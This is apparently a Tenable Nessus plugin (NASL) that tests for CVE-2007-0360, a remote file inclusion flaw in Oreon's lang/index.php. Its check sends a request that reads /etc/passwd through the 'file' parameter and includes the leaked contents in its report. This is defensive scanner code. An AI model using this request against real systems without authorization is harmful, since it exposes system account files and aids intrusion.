#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(24228);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-0360");
  script_bugtraq_id(22107);
  script_xref(name:"OSVDB", value:"33711");

  script_name(english:"Oreon lang/index.php file Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with Oreon");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Oreon, a web-based network supervision
program based on Nagios. 

The installation of Oreon on the remote host fails to sanitize input
to the 'file' parameter of the 'lang/index.php' script before using it
to include PHP code.  Regardless of PHP's 'register_globals' setting,
an unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/3150" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/oreon", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/lang/index.php?",
      "file=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # it looks like Oreon's lang/index.php script and...
    "<title> Traduction </title>" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
  )
  {
    contents = NULL;
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      if ("</center>" >< contents) contents = strstr(contents, "</center>") - "</center>";
      if ("</body>" >< contents) contents = contents - strstr(contents, "</body>");

    }

    if (contents)
    {
      report = string(
        "\n",
        "Here are the repeated contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
